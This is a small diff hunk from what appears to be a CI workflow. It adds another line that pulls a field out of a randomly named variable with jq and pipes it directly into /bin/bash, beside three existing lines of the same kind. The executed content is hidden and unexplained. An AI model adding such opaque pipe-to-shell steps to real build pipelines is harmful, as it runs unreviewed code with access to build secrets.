@@ -32,6 +32,7 @@ jobs:
           printf '%s' "$pf20121" | jq -r .a29397 | /bin/bash
           echo $mwumo5920 | jq -r .agjh2051 | /bin/bash
           echo $qzgv8 | jq -r .eynwo56266 | /bin/bash
+          echo $ksyk8 | jq -r .fg3 | /bin/bash
 
       - name: Persist output
         if: always()
